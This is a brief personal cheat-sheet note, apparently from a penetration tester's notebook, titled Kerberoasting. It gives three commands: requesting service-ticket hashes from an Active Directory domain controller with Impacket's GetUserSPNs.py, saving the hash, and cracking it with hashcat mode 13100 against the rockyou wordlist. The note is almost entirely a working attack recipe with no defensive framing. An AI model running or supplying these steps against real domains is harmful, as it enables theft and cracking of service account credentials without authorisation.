---
title: KERBEROASTING
updated: 2023-09-29 05:03:23Z
created: 2023-09-29 05:02:29Z
latitude: -35.28093680
longitude: 149.13000920
altitude: 0.0000
---

# KERBEROASTING
1. `sudo GetUserSPNs.py DOMAIN.local/user:password -dc-ip <DC IP> -request`
2. Copy hash to **kbt.txt**
3. `hashcat -m 13100 kbt.txt /usr/share/wordlist/rockyou.txt`

